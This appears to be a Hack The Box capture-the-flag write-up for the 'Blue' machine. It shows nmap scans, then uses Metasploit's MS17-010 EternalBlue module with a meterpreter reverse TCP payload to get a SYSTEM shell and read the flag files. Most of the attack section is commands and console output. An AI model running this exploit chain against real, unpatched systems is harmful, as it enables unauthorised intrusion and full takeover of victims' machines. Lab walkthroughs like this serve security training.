---
title: "HTB - Blue"
author: [0x3ds]
date: 2025-10-18 16:00:00 +1000
description: "Blue, while possibly the most simple machine on Hack The Box, demonstrates the severity of the EternalBlue exploit, which has been used in multiple large-scale ransomware and crypto-mining attacks since it was leaked publicly."
categories: [Hack The Box, Machines - Windows]
tags: [htb-blue, blue, hackthebox, machine, ctf, windows, easy, nmap, nmap-scripts, smbmap, smbclient, metasploit, ms17-010, eternalblue, meterpreter, impacket, virtualenv]
image:
  path: /assets/img/posts/htb/machines/windows/easy/blue/blue_infocard.png
cover: /assets/img/posts/htb/machines/windows/easy/blue/blue_infocard.png
---

## Initial Enumeration

We can start out by using the `nmap` tool to perform a port scan in an attempt to try and identify if there are any open ports on the target host. We will start off with a simple scan to try and identify any open ports quickly, so that we can then reassess and perform more targeted detailed scans.

```zsh
0x3ds@kali $ sudo nmap 10.129.246.69 -sV -T4

Nmap scan report for 10.129.246.69
Host is up (0.15s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap done: 1 IP address (1 host up) scanned in 74.95 seconds
```

We can see from the inital `nmap` scan results that there are a few open TCP ports including TCP ports 135, 139, 445.

Additionally, we can see that `nmap` has discovered the host name being `HARIS-PC`, and that it is running the `Windows` Operating System ("OS").

We can perform another `nmap` scan, however this time more in depth by utilising the `-sVC` flag and specifying the particular ports we want to target by passing the `-p` flag.    

```zsh
0x3ds@kali $ sudo nmap 10.129.246.69 -sVC -T4 -p135,139,445

Nmap scan report for 10.129.246.69
Host is up (0.16s latency).

PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-10-18T10:03:01+01:00
| smb2-time: 
|   date: 2025-10-18T09:02:57
|_  start_date: 2025-10-18T08:50:48
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: -18m12s, deviation: 34m35s, median: 1m44s
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required

Nmap done: 1 IP address (1 host up) scanned in 19.24 seconds

```

From the output of the `nmap` scan, we can see that there is a SMB server hosted on a computer called `haris-PC` running the `Windows 7 Professional` OS.


## Vulnerability Analysis

With the target host running a old version of the Windows OS, it is highly likely that there are vulnerabilities that could be exploited to potentially land us a foothold. Some simple researching would lead you to MS17-010, or in other words "Eternal Blue". 

> If you would like to read more about MS17-010 (aka Eternal Blue), feel free to read Microsoft's Security Bulletin they released about it on their website [**here**](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010).

Thankfully for us, there are various tools readily available to assist us with confirming if the target is vulnerable and if so, also exploit it and thus compromise it. First, we can do a quick and easy search to see if there are any `metasploit` modules that we could use.

```zsh
0x3ds@kali $ sudo msfconsole -q -x "search eternal"

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7       .                .        .      .
   4     \_ target: Windows Server 2008 R2            .                .        .      .
   5     \_ target: Windows 8                         .                .        .      .
   6     \_ target: Windows 8.1                       .                .        .      .
   7     \_ target: Windows Server 2012               .                .        .      .
   8     \_ target: Windows 10 Pro                    .                .        .      .
   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   11    \_ target: Automatic                         .                .        .      .
   12    \_ target: PowerShell                        .                .        .      .
   13    \_ target: Native upload                     .                .        .      .
   14    \_ target: MOF upload                        .                .        .      .
   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   18    \_ AKA: ETERNALBLUE                          .                .        .      .
   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   23    \_ AKA: ETERNALBLUE                          .                .        .      .
   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection
   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
   26    \_ AKA: ETERNALBLUE                          .                .        .      .
   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
   28    \_ target: Execute payload (x64)             .                .        .      .
   29    \_ target: Neutralize implant                .                .        .      .


Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce
After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'
```

We can see various results were returned with some even including the ability to check if the target is vulnerable or not.

> Personally, my favourite option when exploiting this vulnerability is the PsExec option, `exploit/windows/smb/ms17_010_psexec`, as I find that it is a lot more stable.

However, for the sake of this lab/machine, we will use the very first option (option 0 - `exploit/windows/smb/ms17_010_eternalblue`).

```zsh
msf > use 0 

[*] No payload configured, defaulting to window/x64/meterpreter/reverse_tcp
```

We can see that the output states we have no payload configured, thus it has selected the default payload `window/x64/meterpreter/reverse_tcp`. In this case we do not need to make any changes to the payload as this should be fine for our current setup.

Next, we need to see what options are available for this module and check to see if we need to set any of them.

```zsh
msf exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see ...
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 tar
                                             get machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target
                                             machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.174.128  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


View the full module info with the info, or info -d command.
```


We can see that there are a few `Required` options that we will need to adjust and set. 

First, we will need to set the `RHOSTS` value to be that of the target, in this case we will set it to the target's IP address.

```zsh
msf exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.129.246.69

RHOSTS => 10.129.246.69
```

Next we will need to set the `LHOST` option to be equal to the IP address we would like to receive the reverse shell on. In this case it will be equal to our `tun0` address which is the IP address assigned to us while we are connected to the Hack the Box environment via the OpenVPN file. 

```zsh
msf exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.14.10

LHOST => 10.10.14.10
```

Additionally, we could also set the `LPORT` option to a another different port from the default port `4444`, but in this case we will just leave it as is.

Now that we have set our options correctly we can utilise the check functionality that this modules offers to see if the target host is vulnerable. 

```zsh
msf exploit(windows/smb/ms17_010_eternalblue) > check

[*] 10.129.246.69:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.129.246.69:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.129.246.69:445     - Scanned 1 of 1 hosts (100% complete)
[+] 10.129.246.69:445 - The target is vulnerable.
```

And *voila*, we can see from the output that the target host is in fact vulnerable.


## Exploitation

Now that we have confirmed that the target host is vulnerable, we can go ahead now and run the exploit module.

```zsh
msf exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.10.14.10:4444 
[*] 10.129.246.69:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.129.246.69:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.129.246.69:445     - Scanned 1 of 1 hosts (100% complete)
[+] 10.129.246.69:445 - The target is vulnerable.
[*] 10.129.246.69:445 - Connecting to target for exploitation.
[+] 10.129.246.69:445 - Connection established for exploitation.
[+] 10.129.246.69:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.129.246.69:445 - CORE raw buffer dump (42 bytes)
[*] 10.129.246.69:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.129.246.69:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.129.246.69:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.129.246.69:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.129.246.69:445 - Trying exploit with 12 Groom Allocations.
[*] 10.129.246.69:445 - Sending all but last fragment of exploit packet
[*] 10.129.246.69:445 - Starting non-paged pool grooming
[+] 10.129.246.69:445 - Sending SMBv2 buffers
[+] 10.129.246.69:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.129.246.69:445 - Sending final SMBv2 buffers.
[*] 10.129.246.69:445 - Sending last fragment of exploit packet!
[*] 10.129.246.69:445 - Receiving response from exploit packet
[+] 10.129.246.69:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.129.246.69:445 - Sending egg to corrupted connection.
[*] 10.129.246.69:445 - Triggering free of corrupted buffer.
[*] Sending stage (203846 bytes) to 10.129.246.69
[*] Meterpreter session 1 opened (10.10.14.10:4444 -> 10.129.246.69:49168) at 2025-10-18 19:42:48 +1000
[+] 10.129.246.69:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.129.246.69:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.129.246.69:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```

Another great success. We have successfully exploited the target and obtained a meterpreter reverse shell.

We can now confirm which user the server is running as.

```zsh
meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM
```

We have compromised the SYSTEM account!


## Post Exploitation

With our elevated privileges, we are in a good position to utilise the built in meterpreter commands to search for the `user.txt` and `root.txt` flags.

```zsh
meterpreter > search -f "user.txt" & search -f "root.txt"

Found 2 results...
==================

Path                                     Size (bytes)  Modified (UTC)
----                                     ------------  --------------
c:\Users\Administrator\Desktop\root.txt  34            2025-10-18 18:51:46 +1000
c:\Users\haris\Desktop\user.txt          34            2025-10-18 18:51:46 +1000
```

Now that we have found the `user.txt` and `root.txt` flag files, we can go ahead and attempt to read the contents of them.

First we can obtain the `user.txt` flag.

```zsh
meterpreter > cat "c:\Users\haris\Desktop\user.txt"

ce5f8***************************
```

Next, we can obtain the `root.txt` flag.

```zsh
meterpreter > cat "c:\Users\Administrator\Desktop\root.txt"

41db3***************************
```





